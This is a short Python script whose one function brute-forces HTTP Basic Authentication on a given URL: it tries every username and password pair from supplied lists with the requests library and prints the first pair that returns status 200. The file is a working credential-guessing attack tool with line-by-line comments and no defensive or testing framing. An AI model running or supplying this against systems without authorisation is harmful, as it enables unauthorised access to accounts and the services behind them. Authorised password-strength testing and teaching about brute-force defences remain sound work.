import requests
from requests.auth import HTTPBasicAuth

# Function to perform brute-force attack on a URL using basic HTTP authentication
def brute(url, usernames, passwords):
    print(f"Starting brute force :- {url}")

    # Loop through all combinations of usernames and passwords
    for user in usernames:
        for pwd in passwords:
            # Send HTTP GET request with current username and password using HTTP Basic Auth
            res= requests.get(url, auth=HTTPBasicAuth(user, pwd))

            # If authentication succeeds (status code 200), print success and return
            if res.status_code == 200:
                print(f"  Success: {user}:{pwd}")
                return  # Exit after finding valid credentials
            else:
                print(f"  Failed: {user}:{pwd}")  # Print failed attempt

    # If no valid credentials are found after all combinations
    print("Brute force failed.")
